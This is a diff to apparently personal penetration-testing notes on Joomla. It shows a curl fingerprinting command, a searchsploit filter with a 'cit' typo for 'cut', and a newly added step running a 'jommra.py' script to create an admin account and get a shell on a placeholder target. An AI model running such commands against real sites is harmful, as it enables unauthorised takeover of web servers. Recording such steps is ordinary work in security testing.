@@ -15,3 +15,9 @@ curl -sSL -D - http://<target-joomla>/index.php -o /dev/null | grep "X-Powered-B
 searchsploit "Joomla" | grep "com_" | cit -f3 -d" " >> comptotestdb.txt
 
 ```
+
+## Jommra.py to add admin account and pop shell
+```bash
+python jommra.py -u user -p userpass55 -e email@foo http://<target-joomla>/joomla
+```
+![[Pasted image 20220218033747.png]]
